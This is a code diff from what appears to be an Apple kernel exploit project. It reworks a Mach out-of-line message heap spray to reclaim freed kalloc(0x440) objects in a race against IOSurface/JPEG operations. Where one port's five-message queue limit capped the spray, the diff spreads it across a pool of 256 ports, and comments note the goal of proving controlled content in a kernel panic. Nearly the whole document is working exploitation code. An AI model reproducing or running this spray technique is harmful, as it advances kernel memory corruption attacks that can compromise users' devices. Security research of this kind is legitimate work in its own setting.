@@ -70,9 +70,6 @@ extern uint32_t IOSurfaceGetID(IOSurfaceRef_ buffer);
 extern void IOSurfaceSetValue(IOSurfaceRef_, CFStringRef, CFTypeRef);
 extern size_t IOSurfaceGetAllocSize(IOSurfaceRef_ buffer);
 extern int IOSurfaceLock(IOSurfaceRef_, uint32_t, uint32_t *);
-// not exported by the SDK umbrella on this toolchain - declared by hand
-extern kern_return_t mach_port_set_qlimit(mach_port_t task, mach_port_t name,
-                                          mach_port_msgcount_t qlimit);
 extern int IOSurfaceUnlock(IOSurfaceRef_, uint32_t, uint32_t *);
 extern void *IOSurfaceGetBaseAddress(IOSurfaceRef_);
 #define kIOSurfaceWidth  CFSTR("IOSurfaceWidth")
@@ -959,12 +956,44 @@ static BOOL rs_jr_healthy(io_service_t svc) {
     return (kr == KERN_SUCCESS);
 }
 
-// count OOL messages of exactly 0x440 bytes to `port`.
+// count OOL messages of exactly 0x440 bytes to the port pool.
 // safeMode == 1 : the PoC layout - 'J' filler, +128 (self-ptr) and +784
 //                 (flags) zeroed, so a landed reclaim does not fault.
 // safeMode == 0 : our canary at every other offset, same two zeroes - a panic
 //                 on our data then proves controlled content.
-static int rs_jr_sprayOOL(mach_port_t port, int count, int safeMode) {
+// A receive port's queue defaults to MACH_PORT_QLIMIT_DEFAULT = 5 messages, so
+// a single port caps the spray at 5 sends (measured: spray=5, then spray=0).
+// mach_port_set_qlimit is not exported by the SDK umbrella on this toolchain
+// (link error), so instead of raising the limit we use a POOL of ports and
+// round-robin: N ports hold N*5 live 0x440 allocations.
+#define RS_JR_PORTS 256
+static mach_port_t rs_jr_ports[RS_JR_PORTS];
+static int rs_jr_nports = 0;
+
+static int rs_jr_setupSprayPorts(void) {
+    rs_jr_nports = 0;
+    for (int i = 0; i < RS_JR_PORTS; i++) {
+        mach_port_t p = MACH_PORT_NULL;
+        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
+        mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
+        rs_jr_ports[i] = p;
+        rs_jr_nports++;
+    }
+    return rs_jr_nports;
+}
+
+static void rs_jr_freeSprayPorts(void) {
+    for (int i = 0; i < rs_jr_nports; i++) {
+        if (rs_jr_ports[i] != MACH_PORT_NULL) {
+            mach_port_destroy(mach_task_self(), rs_jr_ports[i]);
+            rs_jr_ports[i] = MACH_PORT_NULL;
+        }
+    }
+    rs_jr_nports = 0;
+}
+
+static int rs_jr_sprayOOL(int count, int safeMode) {
+    if (rs_jr_nports <= 0) return 0;
     const uint32_t size = 0x440;
     uint8_t *payload = (uint8_t *)malloc(size);
     if (!payload) return 0;
@@ -980,7 +1009,9 @@ static int rs_jr_sprayOOL(mach_port_t port, int count, int safeMode) {
     payload[784] = 0;              // request+784 flags   = 0    -> no fault
     int sent = 0;
     kern_return_t firstFail = 0;
-    for (int i = 0; i < count; i++) {
+    int fails = 0;
+    for (int i = 0; i < count && fails < rs_jr_nports; i++) {
+        mach_port_t port = rs_jr_ports[i % rs_jr_nports];
         struct {
             mach_msg_header_t          header;
             mach_msg_body_t            body;
@@ -999,11 +1030,12 @@ static int rs_jr_sprayOOL(mach_port_t port, int count, int safeMode) {
         msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
         kern_return_t kr = mach_msg(&msg.header, MACH_SEND_MSG | MACH_SEND_TIMEOUT,
                                     sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
-        if (kr != KERN_SUCCESS) { if (!firstFail) firstFail = kr; break; }
+        if (kr != KERN_SUCCESS) { if (!firstFail) firstFail = kr; fails++; continue; }
         sent++;
     }
     if (firstFail)
-        AveLog(S(@"[jpeg440]   spray stopped at %d: mach_msg kr=%#x (port queue full?)", sent, firstFail));
+        AveLog(S(@"[jpeg440]   spray sent=%d, first failure kr=%#x (port queue limit 5 per port, %d ports)",
+                 sent, firstFail, rs_jr_nports));
     free(payload);
     return sent;
 }
@@ -1049,19 +1081,12 @@ NSString *ModJpegReclaim(void) {
     uint32_t srcID = IOSurfaceGetID(src), dstID = IOSurfaceGetID(dst);
 
     // the OOL spray port: messages accumulate, each holding a kalloc(0x440)
-    mach_port_t sprayPort = MACH_PORT_NULL;
-    if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &sprayPort) != KERN_SUCCESS)
-        sprayPort = MACH_PORT_NULL;
-    if (sprayPort != MACH_PORT_NULL) {
-        mach_port_insert_right(mach_task_self(), sprayPort, sprayPort, MACH_MSG_TYPE_MAKE_SEND);
-        // CRITICAL: a receive port's queue defaults to MACH_PORT_QLIMIT_DEFAULT
-        // = 5 messages, so the OOL spray dies after 5 sends (measured: spray=5
-        // then spray=0).  Raise it or the reclaim never actually sprays.
-        kern_return_t ql = mach_port_set_qlimit(mach_task_self(), sprayPort, 4096);
-        AveLog(S(@"[jpeg440] spray port=%#x qlimit(4096) kr=%#x", sprayPort, ql));
-    } else {
-        AveLog(@"[jpeg440] spray port allocation FAILED - no reclaim spray possible");
-    }
+    // the OOL spray port POOL: messages accumulate on these ports, each message
+    // holding one live kalloc(0x440) allocation with our bytes in it
+    int nports = rs_jr_setupSprayPorts();
+    AveLog(S(@"[jpeg440] spray ports: %d (x5 queue limit = %d live 0x440 allocations)",
+             nports, nports * 5));
+    if (nports <= 0) AveLog(@"[jpeg440] WARNING: no spray ports - the reclaim cannot spray");
 
     int64_t wired0 = rs_wired_pages();
     AveLog(S(@"[jpeg440] wired before: %lld pages", wired0));
@@ -1118,7 +1143,7 @@ NSString *ModJpegReclaim(void) {
         });
         dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
             for (int i = 0; i < RACE_ITERS * 20; i++)
-                __sync_fetch_and_add(&raceS, rs_jr_sprayOOL(sprayPort, 1, 1));
+                __sync_fetch_and_add(&raceS, rs_jr_sprayOOL(1, 1));
         });
         dispatch_group_wait(group, dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC));
         victimTotal += raceV; reclaimTotal += raceR; sprayTotal += raceS;
@@ -1149,7 +1174,7 @@ NSString *ModJpegReclaim(void) {
         });
         dispatch_group_async(group, dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
             for (int i = 0; i < RACE_ITERS * 20; i++)
-                __sync_fetch_and_add(&raceS, rs_jr_sprayOOL(sprayPort, 1, 0));
+                __sync_fetch_and_add(&raceS, rs_jr_sprayOOL(1, 0));
         });
         dispatch_group_wait(group, dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC));
         victimTotal += raceV; reclaimTotal += raceR; sprayTotal += raceS;
@@ -1157,7 +1182,7 @@ NSString *ModJpegReclaim(void) {
     }
 
     // release the spray (frees every queued kalloc(0x440) at once)
-    if (sprayPort != MACH_PORT_NULL) mach_port_destroy(mach_task_self(), sprayPort);
+    rs_jr_freeSprayPorts();
     usleep(500000);
 
     int64_t wired1 = rs_wired_pages();
